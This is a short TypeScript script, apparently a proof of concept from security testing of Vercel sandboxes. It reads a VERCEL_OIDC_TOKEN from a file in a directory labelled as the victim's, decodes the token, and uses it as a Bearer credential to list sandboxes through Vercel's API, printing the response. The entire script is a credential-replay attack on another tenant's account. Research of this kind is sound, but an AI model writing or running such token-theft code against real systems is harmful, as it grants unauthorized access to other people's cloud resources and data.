import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());
async function main() {
  const base = "https://vercel.com/api/sandboxes?limit=100";
  const r = await fetch(base, { headers: { Authorization: `Bearer ${VICTIM}` } });
  console.log("status:", r.status);
  const j = await r.json();
  console.log(JSON.stringify(j).slice(0, 1000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
